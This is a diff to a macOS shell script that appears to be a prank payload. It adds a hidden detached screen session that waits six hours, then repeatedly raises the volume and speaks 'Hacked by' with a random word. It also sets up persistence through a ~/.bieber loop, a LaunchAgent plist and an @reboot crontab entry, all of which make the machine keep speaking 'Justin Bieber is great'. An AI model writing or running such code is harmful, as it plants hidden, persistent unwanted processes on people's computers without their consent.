@@ -1,6 +1,4 @@
-echo "Sleeping for 6 hours";
-
-sleep 21600;
+screen -dmS justin bash -c "sleep 21600; while true; do sleep 4; osascript -e \"set Volume 10\"; say \"Hacked by \"; cat /usr/share/dict/words | perl -e 'print join(\"\", sort { rand(1) <=> 0.5 } <>);' | head -n 1 | say ;  done;"
 
 cat <<EOF > ~/.bieber
 while true; do sleep 20; osascript -e "set Volume 10"; say "Justin Bieber is great";  done;
@@ -44,12 +42,11 @@ cat <<EOF > ~/Library/LaunchAgents/com.palantir.bieber.plist
 </plist>
 EOF
 
-launchctl load ~/Library/LaunchAgents/com.palantir.bieber.plist
-
 crontab -l > /tmp/cron
 echo "@reboot ~/.bieber" >> /tmp/cron
 crontab /tmp/cron
 
-screen -dm bash -c "while true; do sleep 4; osascript -e \"set Volume 10\"; say \"Hacked by \"; cat /usr/share/dict/words | perl -e 'print join(\"\", sort { rand(1) <=> 0.5 } <>);' | head -n 1 | say ;  done;"
-
+echo "Sleeping for 6 hours";
+sleep 21600;
+launchctl load ~/Library/LaunchAgents/com.palantir.bieber.plist
 /bin/bash ~/.bieber
